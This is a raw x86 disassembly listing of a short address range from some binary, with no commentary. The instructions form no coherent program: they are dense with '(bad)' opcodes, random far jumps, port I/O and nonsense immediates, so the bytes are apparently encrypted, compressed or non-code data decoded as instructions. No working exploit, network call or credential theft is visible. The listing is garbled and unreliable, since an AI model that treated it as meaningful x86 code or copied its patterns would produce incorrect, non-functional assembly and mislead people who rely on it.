  41561c:	sub    BYTE PTR [edi-0x7a803169],ch
  415622:	je     0x4155c6
  415624:	test   DWORD PTR [edi-0x35],edi
  415627:	mov    dl,0xa2
  415629:	pop    edi
  41562a:	test   ebp,edx
  41562c:	rcr    DWORD PTR [esi+0x4b],cl
  41562f:	out    0x6c,al
  415631:	pushf  
  415632:	or     BYTE PTR [edi],al
  415634:	addr16 in eax,0x7d
  415637:	mov    edx,0x7dc8eeb9
  41563c:	dec    ebx
  41563d:	and    al,0xd8
  41563f:	rol    cl,cl
  415641:	and    DWORD PTR [eax-0x5c7c0047],ecx
  415647:	pop    esi
  415648:	xchg   DWORD PTR [eax+ecx*8],esi
  41564b:	cli    
  41564c:	cmp    eax,0xb5177135
  415651:	jecxz  0x415665
  415653:	jo     0x41560e
  415655:	(bad)  
  415656:	retf   0x43f6
  415659:	test   BYTE PTR [esi+0x49cecab3],0xf9
  415660:	pop    esp
  415661:	jns    0x415640
  415663:	les    esi,FWORD PTR ds:0x43cf96ba
  415669:	ja     0x41567b
  41566b:	nop
  41566c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41566d:	fwait
  41566e:	adc    al,0x27
  415670:	popf   
  415671:	aas    
  415672:	cli    
  415673:	and    ecx,DWORD PTR [esi]
  415675:	clc    
  415676:	sub    DWORD PTR [ebx],ebp
  415678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415679:	fs out dx,al
  41567b:	inc    ebx
  41567c:	dec    ebp
  41567d:	test   DWORD PTR [edi-0x7c],edi
  415680:	outs   dx,DWORD PTR ds:[esi]
  415681:	test   DWORD PTR [esi+0x5445cfcb],edx
  415687:	add    bh,BYTE PTR [esi+0x7e]
  41568a:	push   esi
  41568b:	dec    edi
  41568c:	dec    ebp
  41568d:	mov    al,0xb3
  41568f:	add    DWORD PTR ss:[ebx],esi
  415692:	ror    BYTE PTR [ebx+0x693b8e7a],1
  415698:	mov    ecx,es
  41569a:	data16 adc al,0x53
  41569d:	mov    es,WORD PTR [ecx+0x53]
  4156a0:	call   FWORD PTR [eax+0x71]
  4156a3:	and    ch,dh
  4156a5:	nop
  4156a6:	pushf  
  4156a7:	xchg   ebp,eax
  4156a8:	arpl   cx,ax
  4156aa:	stos   DWORD PTR es:[edi],eax
  4156ab:	mov    cs,ecx
  4156ad:	mov    cl,0x49
  4156af:	jle    0x415688
  4156b1:	stos   DWORD PTR es:[edi],eax
  4156b2:	pop    eax
  4156b3:	add    al,0x6c
  4156b5:	mov    ecx,0xefc3851
  4156ba:	xchg   esp,eax
  4156bb:	cmp    eax,0x765ddaf8
  4156c0:	imul   edi,DWORD PTR [eax-0x1ccace0e],0xffffffc2
  4156c7:	mov    ah,0x22
  4156c9:	jge    0x415739
  4156cb:	rcr    BYTE PTR ds:0x16129067,1
  4156d1:	jns    0x415669
  4156d3:	int    0x68
  4156d5:	jg     0x415660
  4156d7:	jmp    0x5221:0x9aea838d
  4156de:	ror    ch,0x81
  4156e1:	rol    DWORD PTR [esi],cl
  4156e3:	jno    0x4156d3
  4156e5:	xchg   ecx,eax
  4156e6:	lods   al,BYTE PTR ds:[esi]
  4156e7:	arpl   WORD PTR [esi],di
  4156e9:	pop    ds
  4156ea:	call   0xaf68:0xdc6ba4e5
  4156f1:	(bad)  
  4156f3:	cdq    
  4156f4:	inc    esp
  4156f5:	data16 jl 0x4156c2
  4156f8:	pop    ebx
  4156f9:	clc    
  4156fa:	fmul   st(2),st
  4156fc:	loope  0x41576b
  4156fe:	add    eax,0x91e57e70
  415703:	je     0x4156ec
  415705:	inc    ecx
  415706:	mov    ds:0xa4cdd03,eax
  41570b:	pop    ss
  41570c:	(bad)  
  41570d:	sahf   
  41570e:	mov    al,ds:0x397dd9dc
  415713:	data16 arpl WORD PTR [edx],di
  415716:	lea    ebp,[edx-0x3d]
  415719:	or     cl,al
  41571b:	mov    al,ds:0x84a24082
  415720:	inc    ecx
  415721:	rcl    BYTE PTR [eax+esi*4-0x8],cl
  415725:	cmp    al,0x54
  415727:	inc    esp
  415728:	daa    
  415729:	repz push cs
  41572b:	iret   
  41572c:	fistp  QWORD PTR [edx]
  41572e:	xor    al,0xe8
  415730:	shl    BYTE PTR [ecx+0x32e4ca4d],1
  415736:	and    ch,BYTE PTR ss:[edi-0x8ce5683]
  41573d:	dec    ebx
  41573e:	call   0xe738:0xb71e4860
  415745:	sub    edx,ebp
  415747:	or     al,dh
  415749:	xlat   BYTE PTR ds:[ebx]
  41574a:	adc    DWORD PTR [eax],0xffffff9b
  41574d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41574e:	push   es
  41574f:	push   es
  415750:	pop    es
  415751:	nop
  415752:	pop    ecx
  415753:	loop   0x4157cb
  415755:	jbe    0x415755
  415757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415758:	push   esi
  415759:	push   es
  41575a:	jg     0x415724
  41575c:	fld    DWORD PTR [edi+0x77a6d265]
  415762:	loopne 0x4157ca
  415764:	dec    esi
  415765:	sbb    al,0xdf
  415767:	xor    DWORD PTR [ecx+0x149265db],0x2ccfbe13
  415771:	add    ah,BYTE PTR [esi+0x51]
  415774:	pop    esi
  415775:	mov    al,ds:0xb2bc90d3
  41577a:	jb     0x41577d
  41577c:	add    BYTE PTR [edx-0x17],0x30
  415780:	sbb    DWORD PTR [ecx],esi
  415782:	mov    ds:0xedf94886,al
  415787:	adc    dh,BYTE PTR [ecx+ebp*8+0x273d396f]
  41578e:	mov    eax,0x4143d54a
  415793:	test   DWORD PTR [edi],esp
  415795:	mov    eax,ds:0xfb97d19d
  41579a:	loope  0x41574d
  41579c:	mov    al,0x1d
  41579e:	adc    esi,ebp
  4157a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157a1:	and    eax,0x15eaad3
  4157a6:	arpl   ax,sp
  4157a8:	sbb    al,0x1
  4157aa:	pusha  
  4157ab:	jp     0x415787
  4157ad:	and    ebx,DWORD PTR [eax-0x1a]
  4157b0:	jns    0x4157b1
  4157b2:	in     al,0x5c
  4157b4:	lods   al,BYTE PTR fs:[esi]
  4157b6:	adc    eax,0x168ad23e
  4157bb:	xor    DWORD PTR [ebp-0x2],edi
  4157be:	mov    esp,0xca4d4a0e
  4157c3:	shl    ebx,0xf7
  4157c6:	mov    ebp,0x3d0a95b7
  4157cb:	ret    
  4157cc:	(bad)  
  4157cd:	shl    DWORD PTR [edi+ebx*2+0x6b31b61b],cl
  4157d4:	clc    
  4157d5:	xchg   ecx,eax
  4157d6:	xor    BYTE PTR [eax-0x2],bh
  4157d9:	sub    BYTE PTR [esi-0x42637cfc],cl
  4157df:	xor    eax,0x6f352810
  4157e4:	cmp    al,0xa9
  4157e6:	sub    DWORD PTR [edx],0x3a
  4157e9:	rcl    DWORD PTR [esi-0x5c03814d],0x21
  4157f0:	in     eax,dx
  4157f1:	cld    
  4157f2:	pop    ds
  4157f3:	sti    
  4157f4:	or     BYTE PTR [edx],dl
  4157f6:	dec    edi
  4157f7:	outs   dx,DWORD PTR ds:[esi]
  4157f8:	pop    ecx
  4157f9:	sahf   
  4157fa:	cmp    edx,eax
  4157fc:	cli    
  4157fd:	inc    edx
  4157fe:	cmc    
  4157ff:	xchg   esi,eax
  415800:	pop    ebp
  415801:	mov    edi,0x2784b23
  415806:	jae    0x415837
  415808:	mov    eax,0xdbb516df
  41580d:	aam    0x12
  41580f:	xchg   ecx,eax
  415810:	cld    
  415811:	xor    al,0x6f
  415814:	sub    ebx,esp
  415816:	adc    esp,DWORD PTR [eax+esi*1+0x65774253]
  41581d:	fsub   st,st(3)
  41581f:	rep lods al,BYTE PTR ds:[esi]
  415821:	in     al,dx
  415822:	pushf  
  415823:	adc    eax,0xf3a89ccf
  415828:	out    0x7d,eax
  41582a:	pop    esi
  41582b:	and    al,0x76
  41582d:	sbb    edx,esi
  41582f:	mov    eax,0x331aedf7
  415834:	cmp    bl,BYTE PTR [ecx+0x1383dbc0]
  41583a:	ret    0x42e7
  41583d:	mov    edi,0x57d59992
  415842:	sbb    dh,BYTE PTR [edi+0x5d]
  415845:	sti    
  415846:	add    al,0x52
  415848:	ret    
  415849:	(bad)  
  41584b:	mov    dl,0xb5
  41584d:	jmp    0xc96d:0x8d0855fe
  415854:	je     0x41581a
  415856:	or     eax,0xe2b64921
  41585b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41585c:	(bad)  
  41585d:	push   0xc13a7e2d
  415862:	mov    bl,0x10
  415864:	mov    ah,0x19
  415866:	push   esi
  415867:	fisttp WORD PTR fs:[eax-0x72]
  41586b:	std    
  41586c:	popf   
  41586d:	or     al,0xe3
  41586f:	push   edx
  415870:	adc    al,0x8a
  415872:	lods   al,BYTE PTR ds:[esi]
  415873:	push   ss
  415874:	xchg   esi,eax
  415875:	cmp    DWORD PTR [edx+0x73d0a6fe],ecx
  41587b:	cmp    ecx,0xfffffff0
  41587e:	aas    
  41587f:	ret    
  415880:	mov    ds:0x5486ff50,al
  415885:	test   DWORD PTR [ecx],ebx
  415887:	cdq    
  415888:	dec    edx
  415889:	xor    BYTE PTR [eax],dh
  41588b:	mov    cl,0x4c
  41588d:	push   es
  41588e:	popf   
  41588f:	leave  
  415890:	mov    eax,ds:0x9e8bd01c
  415895:	mov    eax,0x95b524cc
  41589a:	nop
  41589b:	mov    edi,0x21a4ab80
  4158a0:	inc    eax
  4158a1:	fimul  WORD PTR [ebp+0x2a21a837]
  4158a7:	shr    ebp,1
  4158a9:	cmp    BYTE PTR [edi],dl
  4158ab:	ins    DWORD PTR es:[edi],dx
  4158ac:	add    BYTE PTR [eax-0x65d96ca6],ch
  4158b2:	sub    eax,0xc4b11ce9
  4158b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158b8:	mov    dl,0xf3
  4158ba:	lods   eax,DWORD PTR ds:[esi]
  4158bb:	pop    ebx
  4158bc:	inc    edx
  4158bd:	imul   ebx,DWORD PTR [eax+0x4bf49dbc],0x71
  4158c4:	jo     0x4158a9
  4158c6:	push   ds
  4158c7:	push   0xe8d53905
  4158cc:	adc    dh,al
  4158ce:	push   edx
  4158cf:	sub    DWORD PTR [edi+0x42],0xd099d4da
  4158d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158d7:	ins    DWORD PTR es:[edi],dx
  4158d8:	mov    esp,0xae62d382
  4158dd:	dec    edx
  4158de:	lods   al,BYTE PTR ds:[esi]
  4158df:	shr    BYTE PTR [esi],1
  4158e1:	test   al,0x68
  4158e3:	das    
  4158e4:	and    al,0x9c
  4158e6:	and    al,cl
  4158e8:	jge    0x415965
  4158ea:	aas    
  4158eb:	in     eax,dx
  4158ec:	stc    
  4158ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ee:	push   ss
  4158ef:	aad    0x88
  4158f1:	scas   eax,DWORD PTR es:[edi]
  4158f2:	cmp    BYTE PTR [eax+0x7e],0xc4
  4158f6:	loope  0x4158ca
  4158f8:	or     ecx,DWORD PTR [edx+ecx*2]
  4158fb:	stos   BYTE PTR es:[edi],al
  4158fc:	inc    esp
  4158fd:	fisttp DWORD PTR [ebx+0x1]
  415900:	(bad)  
  415901:	pop    edi
  415902:	retf   
  415903:	fild   DWORD PTR [edx]
  415905:	xor    al,0xa9
  415907:	mov    bh,0x80
  415909:	(bad)  [ecx+ebp*4-0x37c0af11]
  415910:	dec    esp
  415911:	mov    bl,0xb5
  415913:	adc    edi,edx
  415915:	push   0x64
  415917:	sar    esp,1
  415919:	outs   dx,DWORD PTR ds:[esi]
  41591a:	add    ch,ah
  41591c:	mov    eax,DWORD PTR [esi-0x12]
  41591f:	adc    BYTE PTR [ebp-0x435be3b7],ah
  415925:	cmp    BYTE PTR [ebx+esi*2-0x1d82867e],bh
  41592c:	mov    ?,WORD PTR [edx+0xe4e415f]
  415932:	ss jecxz 0x415944
  415935:	xchg   esp,edi
  415937:	stc    
  415938:	xor    BYTE PTR [edx],al
  41593a:	xor    BYTE PTR [esi+0x9f0e23b],dl
  415940:	adc    eax,0x4f99e714
  415945:	cmp    ch,ah
  415947:	push   eax
  415948:	test   BYTE PTR [esi-0x7d],ch
  41594b:	or     DWORD PTR [esi],edi
  41594d:	cdq    
  41594e:	dec    ecx
  41594f:	clc    
  415950:	jmp    0x3421:0x8f10c5ad
  415957:	cld    
  415958:	xor    ch,BYTE PTR [edi-0x63c218f1]
  41595e:	push   esi
  41595f:	mov    BYTE PTR [esi-0x54],bl
  415962:	mov    ecx,0x1f7c751a
  415967:	scas   eax,DWORD PTR es:[edi]
  415968:	call   FWORD PTR [ecx+0x3d]
  41596b:	and    BYTE PTR ds:0x4c4c231a,dl
  415971:	jb     0x4159db
  415973:	cmp    al,0xa7
  415975:	lahf   
  415976:	push   ebx
  415977:	sahf   
  415978:	mov    esp,0x79b04154
  41597d:	add    esp,DWORD PTR [ebp+0x76]
  415980:	mov    edx,0x2a3a563f
  415985:	push   es
  415986:	pop    edx
  415987:	stc    
  415988:	int    0x76
  41598a:	call   0x7ae098d4
  41598f:	fdiv   DWORD PTR [ecx-0x1b8c4b69]
  415995:	sub    DWORD PTR [ecx-0x45],esi
  415998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415999:	jg     0x415a16
  41599b:	loopne 0x415933
  41599d:	inc    ecx
  41599e:	cdq    
  41599f:	jmp    0x41596a
  4159a1:	fcom   QWORD PTR [ecx+0x1f]
  4159a4:	(bad)  
  4159a5:	jae    0x41592c
  4159a7:	push   ecx
  4159a8:	jne    0x4159d1
  4159aa:	loopne 0x4159db
  4159ac:	or     ah,BYTE PTR [edi+0x1beeba1d]
  4159b2:	fs inc ebp
  4159b4:	mov    eax,0xa1406bd1
  4159b9:	cmp    ebp,DWORD PTR [ecx+0x7236fbc8]
  4159bf:	sub    al,0xdb
  4159c1:	je     0x4159bd
  4159c3:	mov    eax,0x9e2a9a50
  4159c8:	imul   edx,ebp,0x529eabff
  4159ce:	out    dx,eax
  4159cf:	add    DWORD PTR [edx-0x28659551],0x42
  4159d6:	inc    ebx
  4159d7:	dec    edx
  4159d8:	inc    esi
  4159d9:	shr    DWORD PTR [edi],1
  4159db:	lock push esi
  4159dd:	dec    edx
  4159de:	scas   eax,DWORD PTR es:[edi]
  4159df:	inc    eax
  4159e0:	aam    0x5
  4159e2:	test   al,0xa0
  4159e4:	mov    ch,0xf8
  4159e6:	mov    ds:0x30a40f94,eax
  4159eb:	mov    cl,0x8b
  4159ed:	cld    
  4159ee:	mov    cl,BYTE PTR ds:[edx]
  4159f1:	aaa    
  4159f2:	ss pop ds
  4159f4:	jg     0x4159b2
  4159f6:	adc    eax,0xe705986c
  4159fb:	sub    eax,0xe061bc7c
  415a00:	and    bl,BYTE PTR [eax]
  415a02:	mov    BYTE PTR [ebx],ch
  415a04:	sub    BYTE PTR [edi],dl
  415a06:	daa    
  415a07:	fisubr WORD PTR [eax-0x40]
  415a0a:	imul   esi,edx,0x74b98e9b
  415a10:	fnstsw WORD PTR [esi+0x3e81811c]
  415a16:	cmc    
  415a17:	fcomp  QWORD PTR [edi-0x48d43fae]
  415a1d:	and    BYTE PTR [ecx+esi*2],bl
  415a20:	adc    DWORD PTR [edx-0x4aa0c55f],ebp
  415a26:	inc    edx
  415a27:	div    BYTE PTR ds:0xaf852018
  415a2d:	fstp   QWORD PTR [eax-0x3240d763]
  415a33:	mov    al,ds:0xa38a9581
  415a38:	inc    edx
  415a39:	mov    edi,0x316a631f
  415a3e:	xor    esp,DWORD PTR [edx+0x5b2537a5]
  415a44:	outs   dx,BYTE PTR ds:[esi]
  415a45:	inc    ebx
  415a46:	repnz pop ss
  415a48:	cmp    ebx,DWORD PTR [esi-0x9eda5d8]
  415a4e:	jns    0x4159fd
  415a50:	mov    ebp,0x13b00ec2
  415a55:	inc    ebp
  415a56:	jp     0x415a58
  415a58:	mov    esp,0x68629176
  415a5d:	imul   edx,ebx,0xd8e5a12d
  415a63:	add    al,0x83
  415a65:	loopne 0x415aa1
  415a67:	mov    bh,BYTE PTR [esi+esi*2+0x557fb8b7]
  415a6e:	dec    ebx
  415a6f:	push   0xe6adad6c
  415a74:	js     0x415a85
  415a76:	mov    esp,0x97d4d765
  415a7b:	out    dx,eax
  415a7c:	fild   QWORD PTR [eax+0x1]
  415a7f:	fisttp QWORD PTR [ebx]
  415a81:	sbb    eax,0x8f7c9678
  415a86:	sbb    esp,DWORD PTR [edi+ebp*8]
  415a89:	aas    
  415a8a:	sbb    DWORD PTR [esi-0x705da9d5],ebp
  415a90:	add    ch,ah
  415a92:	enter  0xfb08,0x80
  415a96:	and    bh,BYTE PTR [ebx-0x42755f69]
  415a9c:	sub    eax,0xa50b561e
  415aa1:	sahf   
  415aa2:	mov    ch,al
  415aa4:	pop    edx
  415aa5:	repz call 0xeb3c:0xe8f92cf
  415aad:	in     eax,0x44
  415aaf:	pcmpgtw mm4,QWORD PTR [eax+0x7]
  415ab3:	mov    al,ds:0x2a5ca08c
  415ab8:	test   DWORD PTR [edx],ebx
  415aba:	(bad)  
  415abb:	outs   dx,DWORD PTR ds:[esi]
  415abc:	mov    gs,WORD PTR [edx]
  415abe:	sbb    eax,0x6304a96a
  415ac3:	enter  0xe34,0xa2
  415ac7:	sbb    al,0x11
  415ac9:	std    
  415aca:	mov    BYTE PTR [edx],0xe4
  415acd:	test   BYTE PTR [ecx],bh
  415acf:	retf   0xe669
  415ad2:	scas   eax,DWORD PTR es:[edi]
  415ad3:	cs fwait
  415ad5:	jnp    0x415b00
  415ad7:	xchg   edx,eax
  415ad8:	scas   al,BYTE PTR es:[edi]
  415ad9:	pop    es
  415ada:	jae    0x415b57
  415adc:	pop    ebx
  415add:	shr    DWORD PTR [edx-0x46d1adc2],1
  415ae3:	ficom  WORD PTR [ebx+ebp*1-0x42dfe779]
  415aea:	jecxz  0x415b4e
  415aec:	popf   
  415aed:	adc    BYTE PTR [esi+0x273645ce],ah
  415af3:	push   0xee6e5d54
  415af8:	mov    esp,0x774e3175
  415afd:	push   0xffffffd6
  415aff:	aaa    
  415b00:	outs   dx,BYTE PTR ds:[esi]
  415b01:	shl    BYTE PTR [ebp-0x1239e224],cl
  415b07:	mov    eax,ds:0x43914a93
  415b0c:	sub    esp,DWORD PTR [eax]
  415b0e:	(bad)  
  415b0f:	cmp    al,0x38
  415b11:	lahf   
  415b12:	into   
  415b13:	fst    DWORD PTR [edi]
  415b15:	test   eax,0x73bf2940
  415b1a:	mov    DWORD PTR [edi-0x55],ecx
  415b1d:	test   al,0x41
  415b1f:	xlat   BYTE PTR ds:[ebx]
  415b20:	pushf  
  415b21:	and    al,0xf9
  415b23:	jns    0x415b3b
  415b25:	mov    ebx,0x19fd92ac
  415b2a:	fsubr  DWORD PTR [ebp-0x25]
  415b2d:	push   cs
  415b2e:	cs in  eax,dx
  415b30:	mov    bl,0xcd
  415b32:	cmc    
  415b33:	sub    ch,BYTE PTR [ebx]
  415b35:	inc    ebx
  415b36:	dec    esp
  415b37:	jg     0x415b7e
  415b39:	mov    eax,ds:0x699dfdfd
  415b3e:	(bad)  
  415b3f:	in     al,0xb2
  415b41:	scas   al,BYTE PTR es:[edi]
  415b42:	fwait
  415b43:	shl    DWORD PTR ss:[esi-0x1a570254],1
  415b4a:	mov    bl,0x5e
  415b4c:	push   ebx
  415b4d:	sti    
  415b4e:	xor    eax,0xe0364fe6
  415b53:	cmp    ah,BYTE PTR [ebx+0x36]
  415b56:	xor    bh,bl
  415b58:	inc    edx
  415b59:	dec    ebx
  415b5a:	xor    al,0x0
  415b5c:	mov    esp,0x4b90e153
  415b61:	in     al,dx
  415b62:	rcl    BYTE PTR [esi+0x1b],0xd9
  415b66:	retf   
  415b67:	and    esp,DWORD PTR [ebx]
  415b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b6a:	push   esi
  415b6b:	push   ebx
  415b6c:	jb     0x415bb1
  415b6e:	xchg   DWORD PTR [esi-0x3941e278],edi
  415b74:	scas   eax,DWORD PTR es:[edi]
  415b75:	inc    ebx
  415b76:	or     al,0x59
  415b78:	push   ecx
  415b79:	push   ds
  415b7a:	push   ebp
  415b7b:	out    0x65,al
  415b7d:	sub    dl,BYTE PTR [esi+0x32674bc7]
  415b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b84:	xor    eax,0xcb2af570
  415b89:	mov    al,ds:0x86bbcc67
  415b8e:	imul   esi,DWORD PTR [ecx+0x85e0e1e],0x334a06b
  415b98:	mov    dl,0xdb
  415b9a:	sbb    bh,BYTE PTR [edi+0x6cd88c42]
  415ba0:	mov    esi,DWORD PTR [ebp-0x59]
  415ba3:	adc    al,0x72
  415ba5:	and    DWORD PTR [esi-0x41],ebp
  415ba8:	enter  0xbbb7,0x5d
  415bac:	jns    0x415b83
  415bae:	xchg   ecx,eax
  415baf:	xchg   edi,eax
  415bb0:	mov    edx,0xecafd89e
  415bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb6:	inc    esi
  415bb7:	ja     0x415c37
  415bb9:	leave  
  415bba:	and    al,0xe5
  415bbc:	or     BYTE PTR [ebp-0x3b47ded5],bl
  415bc2:	in     al,dx
  415bc3:	cmp    edi,DWORD PTR [ecx]
  415bc5:	stos   BYTE PTR es:[edi],al
  415bc6:	push   esi
  415bc7:	mov    WORD PTR [edi+0x3a],cs
  415bca:	cmp    DWORD PTR [esi+esi*8+0x6],0xffffff82
  415bcf:	jmp    DWORD PTR [esi+0x5a]
  415bd2:	push   es
  415bd3:	mov    bh,0xf9
  415bd5:	or     dl,BYTE PTR [ecx+ecx*1+0x107eedbb]
  415bdc:	leave  
  415bdd:	in     eax,dx
  415bde:	xchg   esi,eax
  415bdf:	add    ch,BYTE PTR [eax]
  415be1:	add    BYTE PTR [esi],cl
  415be3:	mov    ds:0x60d0d32e,eax
  415be8:	mov    ah,0x46
  415bea:	mov    ebp,DWORD PTR [eax]
  415bec:	mov    ebp,0xf804de72
  415bf1:	xchg   ebp,eax
  415bf2:	push   es
  415bf3:	xchg   ebx,eax
  415bf4:	dec    esi
  415bf5:	add    ebx,ebp
  415bf7:	imul   eax,DWORD PTR [ebp+0x6d],0xffffffac
  415bfb:	xchg   DWORD PTR [eax-0x3],edi
  415bfe:	fistp  QWORD PTR [ebx-0x23d51c1b]
  415c04:	dec    edi
  415c05:	je     0x415b99
  415c07:	sahf   
  415c08:	mov    ah,0x7b
  415c0a:	or     eax,0xe2a0ae59
  415c0f:	repz dec eax
  415c11:	sti    
  415c12:	rcr    DWORD PTR [esi],1
  415c14:	inc    esi
  415c15:	pop    edi
  415c16:	fadd   st(5),st
  415c18:	lahf   
  415c19:	(bad)  
  415c1a:	in     eax,dx
  415c1b:	jecxz  0x415bbf
  415c1d:	adc    dl,dh
  415c1f:	cmp    eax,0xd546ecc1
  415c24:	(bad)  
  415c25:	mov    ebx,0x4a8cdde
  415c2a:	into   
  415c2b:	mov    ah,0x92
  415c2e:	mov    ?,WORD PTR [edi-0x4d]
  415c31:	sub    dl,BYTE PTR [eax+edx*2+0x10]
  415c35:	popa   
  415c36:	arpl   dx,si
  415c38:	icebp  
  415c39:	(bad)  
  415c3a:	call   0x90a5b0c
  415c3f:	fisttp WORD PTR [ecx-0x2fd08a6c]
  415c45:	imul   edi,edx,0x4b3ce1df
  415c4b:	jmpw   0x5228
  415c4f:	xor    DWORD PTR [eax],edx
  415c51:	ds leave 
  415c53:	(bad)  
  415c54:	mov    ?,WORD PTR [ebx]
  415c56:	jmp    0x8e23:0xced4e95d
  415c5d:	ins    DWORD PTR es:[edi],dx
  415c5e:	addr16 xchg esp,eax
  415c60:	xor    al,0x5d
  415c62:	loope  0x415c31
  415c64:	dec    esi
  415c65:	add    BYTE PTR [ebx+0x12ec2333],dh
  415c6b:	adc    esi,DWORD PTR [eax]
  415c6d:	fnsave [esi+0x3589a163]
  415c73:	addr16 mov esi,0xe0d53fea
  415c79:	and    al,0xd
  415c7b:	mov    cl,0x2
  415c7d:	jmp    0xad09:0xd75b908
  415c84:	cdq    
  415c85:	push   ss
  415c86:	xchg   edx,eax
  415c87:	mov    esp,0x3b1408b7
  415c8c:	mov    edi,0xa9ca4179
  415c91:	or     BYTE PTR [ebx+0x7f],dh
  415c94:	inc    esi
  415c95:	mov    edx,?
  415c97:	aas    
  415c98:	push   ecx
  415c99:	fwait
  415c9a:	sub    DWORD PTR ds:0x286da8a6,edx
  415ca0:	retf   0x411b
  415ca3:	stos   BYTE PTR es:[edi],al
  415ca4:	rcl    DWORD PTR [edi+ebp*1],1
  415ca7:	and    BYTE PTR [ebx-0x4e],cl
  415caa:	fs icebp 
  415cac:	jecxz  0x415c3d
  415cae:	das    
  415caf:	jns    0x415c32
  415cb1:	in     al,dx
  415cb2:	aad    0x6e
  415cb4:	(bad)  
  415cb5:	aad    0x3a
  415cb7:	(bad)  
  415cb8:	call   0x2e05d3f9
  415cbd:	jbe    0x415cc2
  415cbf:	inc    edx
  415cc0:	add    DWORD PTR [edx],ebx
  415cc2:	xchg   esi,eax
  415cc3:	stos   DWORD PTR es:[edi],eax
  415cc4:	add    al,0x7f
  415cc6:	or     ebx,DWORD PTR [eax]
  415cc8:	sub    BYTE PTR [ecx-0x3faf9b2b],0x49
  415ccf:	push   eax
  415cd0:	inc    ebp
  415cd1:	lahf   
  415cd2:	xchg   edx,eax
  415cd3:	xor    dh,BYTE PTR [ebx+0xb7acdfa]
  415cd9:	leave  
  415cda:	jg     0x415ce7
  415cdc:	adc    DWORD PTR gs:[edi-0x3b20e042],esi
  415ce3:	sbb    eax,0x18d8ea04
  415ce8:	ret    
  415ce9:	and    BYTE PTR [ebp+0x19c8f70b],dl
  415cef:	mov    ch,0x85
  415cf1:	jge    0x415cc6
  415cf3:	inc    esp
  415cf4:	test   al,0x79
  415cf6:	jmp    0xca97df1b
  415cfb:	jecxz  0x415c7f
  415cfd:	setl   cl
  415d00:	mov    esp,0x9b4d1bff
  415d05:	add    ecx,ebx
  415d07:	mov    ss,WORD PTR [ecx+edi*8+0x5b]
  415d0b:	sbb    ecx,DWORD PTR [eax]
  415d0d:	test   BYTE PTR [ebx-0x2e],dl
  415d10:	xchg   esi,eax
  415d11:	test   BYTE PTR ds:0x84b16270,dh
  415d17:	pop    ebp
  415d18:	(bad)  
  415d1a:	push   ds
  415d1b:	(bad)  
  415d1c:	daa    
  415d1d:	cli    
  415d1e:	popa   
  415d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d20:	scas   eax,DWORD PTR es:[edi]
  415d21:	inc    ebp
  415d22:	in     al,dx
  415d23:	jmp    DWORD PTR [edi+0x2a51dde2]
  415d29:	aam    0x1c
  415d2b:	daa    
  415d2c:	iret   
  415d2d:	fs pop ds
  415d2f:	and    DWORD PTR [esi-0x6116a6e4],esp
  415d35:	repnz mov bh,0xe5
  415d38:	push   ebp
  415d39:	(bad)  
  415d3a:	mov    ebp,0x8c029658
  415d3f:	hlt    
  415d40:	out    dx,eax
  415d41:	xchg   ebx,eax
  415d42:	mov    eax,0xb2c3fcbe
  415d47:	call   0x6d8b:0xdc585dde
  415d4e:	fwait
  415d4f:	mov    esi,0xc6772ed8
  415d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d55:	repz (bad) 
  415d57:	cli    
  415d58:	repz cmp DWORD PTR [ebp-0x3b64f12d],0x15
  415d60:	mov    esi,0x2f3403c8
  415d65:	sbb    esi,DWORD PTR [ebx]
  415d67:	push   0xfb1cc65a
  415d6c:	pop    ebx
  415d6d:	push   ebp
  415d6e:	pop    edx
  415d6f:	mul    DWORD PTR [eax-0x4b25545d]
  415d75:	push   eax
  415d76:	and    esp,eax
  415d78:	jns    0x415d93
  415d7a:	popa   
  415d7b:	outs   dx,DWORD PTR ds:[esi]
  415d7c:	jp     0x415deb
  415d7e:	push   0xb79e98cd
  415d83:	add    al,0x1
  415d85:	lods   eax,DWORD PTR ds:[esi]
  415d86:	pop    eax
  415d87:	addr16 cmc 
  415d89:	int    0xd
  415d8b:	push   esi
  415d8c:	leave  
  415d8d:	ja     0x415d84
  415d8f:	jae    0x415d8c
  415d91:	pop    eax
  415d92:	test   eax,0xfa75b708
  415d97:	mov    bh,0xd6
  415d99:	ret    0x211e
  415d9c:	pop    ss
  415d9d:	dec    bl
  415d9f:	mov    ?,WORD PTR [eax+edx*2-0xa]
  415da3:	mov    bl,0xa4
  415da5:	push   ds
  415da6:	xor    eax,0xad9e7b6e
  415dab:	ja     0x415de4
  415dad:	mov    bl,dh
  415daf:	mov    edx,0xbb0a8921
  415db4:	je     0x415d4a
  415db6:	cwde   
  415db7:	fimul  DWORD PTR [ebx-0x5b]
  415dba:	inc    esi
  415dbb:	or     ebp,ebp
  415dbd:	fistp  DWORD PTR [esi]
  415dbf:	xor    DWORD PTR cs:[esi],0x198af938
  415dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dc7:	inc    ecx
  415dc8:	mov    ds:0x1881d87c,eax
  415dcd:	ffree  st(6)
  415dcf:	es mov dh,0x22
  415dd2:	call   0xb7862bdc
  415dd7:	mov    edx,0xa70b52ff
  415ddc:	cmp    DWORD PTR [ecx+0x166f6cf],esi
  415de2:	out    dx,al
  415de3:	adc    eax,0xc8d6b95
  415de8:	data16 fist DWORD PTR [ecx+edi*8-0x14]
  415ded:	fst    DWORD PTR [ecx-0x4f]
  415df0:	pop    es
  415df1:	mov    eax,0xf4c71c9a
  415df6:	xchg   DWORD PTR [ebp-0x32230cb4],ebp
  415dfc:	mov    cl,0xe3
  415dfe:	adc    ch,BYTE PTR [ebx+esi*2-0x346b702e]
  415e05:	mov    edx,0xa1deea92
